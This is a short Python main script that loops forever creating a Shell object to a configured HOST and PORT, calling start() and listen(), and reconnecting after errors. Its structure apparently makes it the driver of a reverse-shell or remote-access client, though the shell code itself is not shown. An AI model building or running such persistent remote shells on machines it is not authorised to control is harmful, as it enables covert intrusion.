from time import sleep
from core.shell import Shell
from config.settings import HOST, PORT

def main():
    while True:
        shell = Shell(HOST, PORT)
        try:
            shell.start()
            shell.listen()
        except KeyboardInterrupt:
            print("\n[!] encerrando")
            break
        except Exception as e:
            print(f"[-] {e}")
            sleep(2)
        finally:
            shell.conn.close()

if __name__ == "__main__":
    main()
